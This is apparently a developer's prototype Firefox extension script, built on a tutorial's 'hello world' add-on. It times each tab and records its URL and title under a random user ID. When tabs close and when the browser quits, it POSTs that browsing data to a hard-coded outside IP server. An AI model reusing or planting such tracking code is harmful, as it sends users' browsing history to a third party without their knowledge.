var container = gBrowser.tabContainer,	
  interval,
  url="http://54.191.81.102:8000/update/",
  randomIDNum,
  prefs = Components.classes["@mozilla.org/preferences-service;1"]
                    .getService(Components.interfaces.nsIPrefService),
  prefs = prefs.getBranch("extensions.xulschoolhello1."),
  cookieManager = Components.classes["@mozilla.org/cookiemanager;1"]
                  .getService(Components.interfaces.nsICookieManager2),
  deleteCookieManager = Components.classes["@mozilla.org/cookiemanager;1"]
                  .getService(Components.interfaces.nsICookieManager),
  ourDomain = "54.191.81.102",
  path = "/",
  uCookieName="_raid",
  uViewTime="_vt",
  uTabCountName="_tc",
  uViewTimeValue=0,
  uTabCountValue=0,
  myObserverObj,
  tab,
  tabURL,
  cookieExpire=2147385600;
let timingCounter={};
let tabTitles={};
let request = Components.classes["@mozilla.org/xmlextras/xmlhttprequest;1"]
              .createInstance(Components.interfaces.nsIXMLHttpRequest); 
container.addEventListener("TabClose", tabRemoved, false);
container.addEventListener("TabAttrModified", tabAttrModified, false);
let listener = {
  onUninstalling: function(addon,trueBool) {
    if (addon.id == "helloworld@xulschool.com") {
      alert("helloworld@xulschool.com is BEING uninstalled"+addon.id);
      if (prefs.prefHasUserValue(uCookieName))
        prefs.setIntPref(uCookieName, -1);
      if (prefs.prefHasUserValue(uViewTime))
        prefs.setIntPref(uViewTime, 0);
      if (prefs.prefHasUserValue(uTabCountName))
        prefs.setIntPref(uTabCountName, -1);
      deleteCookieManager.remove(ourDomain,uCookieName,path,false); //false -- Indicates if cookies from this host should be permanently blocked.
      deleteCookieManager.remove(ourDomain,uViewTime,path,false); 
    }    
  }  
}
try {
  Components.utils.import("resource://gre/modules/AddonManager.jsm");
  AddonManager.addAddonListener(listener);    
} catch (ex) {
  alert("exception");
}
//---------------------------
function tabRemoved(event) {
  //var browserTabRemoved = gBrowser.getBrowserForTab(event.target);    
  tab = event.target;
  tabURL=content.document.URL;
  if(tabURL!="about:newtab" && tabURL!="about:config" && tabURL!="about:blank" && tabURL!="about:addons" && tabURL!="about:newtab") {
    if ((!prefs.prefHasUserValue(uCookieName) || prefs.getIntPref(uCookieName) == -1) && (!prefs.prefHasUserValue(uViewTime) || prefs.getIntPref(uViewTime) == 0)) {        
      randomIDNum=parseInt(Number(Math.random()*100000));
      prefs.setIntPref(uCookieName, randomIDNum);
      prefs.setIntPref(uViewTime,0); //initially set to zero
      prefs.setIntPref(uTabCountName,0);
      try {
        cookieManager.add (ourDomain, path, uCookieName, randomIDNum.toString(), false, false,false, cookieExpire);
      }
      catch (e) {
        content.console.log("setCookie error:" + e);
      }
      //alert("Pref not existed:"+randomIDNum);
    }
    else {        
      randomIDNum=prefs.getIntPref(uCookieName);
      //alert("Pref DID existed:"+randomIDNum);
    }
    uCookieValue=randomIDNum.toString();
    uViewTimeValue=prefs.getIntPref(uViewTime)+timingCounter[tabURL];    
    uTabCountValue=prefs.getIntPref(uTabCountName)+1;
    prefs.setIntPref(uTabCountName,uTabCountValue);
    setCookie();
    postData(tabURL,timingCounter[tabURL],tabTitles[tabURL]);
    //send data to server after the tab is closed...    
    alert("URL sent:"+url+""+"u="+tabURL+"&t="+timingCounter[tabURL]+"&ti="+content.document.title);  
    delete timingCounter[tabURL];  
    delete tabTitles[tabURL];
    myObserverObj = new myObserver();
  }
}

function setCookie() {
  try {
    if(uTabCountValue>=2) {
      cookieManager.add (ourDomain, path, uCookieName, uCookieValue, false, false,false, cookieExpire);
      alert("_raid cookie set after "+uTabCountValue+" tab closed");
      uTabCountValue=0;      
    }
    cookieManager.add (ourDomain, path, uViewTime,uViewTimeValue, false, false,false, cookieExpire);
    prefs.setIntPref(uViewTime,uViewTimeValue);
    prefs.setIntPref(uTabCountName,uTabCountValue);
  } 
  catch(e) {
    content.console.log("setCookie error:" + e);
  }
}
function tabAttrModified(event) {
  tab = event.target;
  tabURL=content.document.URL;
  if(tab.selected && tabURL!="about:blank" && tabURL!="about:addons" && tabURL!="about:newtab") {
    if(timingCounter[tabURL]==undefined)      
        timingCounter[tabURL]=0;
    if(tabTitles[tabURL]==undefined)
      tabTitles[tabURL]=content.document.title;
  	clearInterval(interval);
  	content.console.log("Resumed/started at : "+timingCounter[tabURL]+" URL:"+tabURL);
  	interval=setInterval(function(){
  		timingCounter[tabURL]++;
  		content.console.log("Inside tabAttrModified "+timingCounter[tabURL]+" URL:"+tabURL);
  		if(timingCounter[tabURL]%20==0) {
  		  content.console.log("--------------Logging start-----------------");
  			for(var propertyName in timingCounter) {			   
			   content.console.log(timingCounter[propertyName]+" URL:"+propertyName);
			  }
        for(var propertyName in tabTitles) {         
         content.console.log(tabTitles[propertyName]+" URL:"+propertyName);
        }
			  content.console.log("--------------Logging End-----------------");
  		}
  	},1000);
  }
  else {
  	clearInterval(interval);
  	//content.console.log("Stopped at : "+timingCounter[tabURL]+" URL:"+tabURL);
  }
}
function fetch() {
}
function myObserver()
{
  this.register();
}
myObserver.prototype = {
  observe: function(subject, topic, data) {
   if (topic == "quit-application-requested") {    
    var num = gBrowser.browsers.length;
    for (var i = 0; i < num; i++) {
      var openedTab = gBrowser.getBrowserAtIndex(i);      
      try {
        //alert(openedTab.currentURI.spec+" "+tabTitles[openedTab.currentURI.spec.toString()]);
        alert(openedTab.currentURI.spec.toString()+" "+timingCounter[openedTab.currentURI.spec.toString()].toString()+" "+tabTitles[openedTab.currentURI.spec.toString()].toString()+" MONIL");
        postData(openedTab.currentURI.spec.toString(),timingCounter[openedTab.currentURI.spec.toString()].toString(),tabTitles[openedTab.currentURI.spec.toString()].toString());        
      } 
      catch(e) {
      }
    }
    //this.unregister();
   }      
  },
  register : function() {
    var observerService = Components.classes["@mozilla.org/observer-service;1"].
                             getService(Components.interfaces.nsIObserverService);  
    observerService.addObserver(this, "quit-application-requested", false);
  },
  unregister: function() {
    var observerService = Components.classes["@mozilla.org/observer-service;1"].
                          getService(Components.interfaces.nsIObserverService);
    observerService.removeObserver(this, "quit-application-requested");    
  }
}

function postData(u,t,ti) {
  url="http://54.191.81.102:8000/update/";
  url+=randomIDNum.toString();
  url+="/";
  request.open("POST", url, true);        
  request.onreadystatechange = fetch;
  request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");        
  request.send("u="+u+"&t="+t+"&ti="+ti);
  //alert("URL sent:"+url+""+"u="+u+"&t="+t+"&ti="+ti);  
}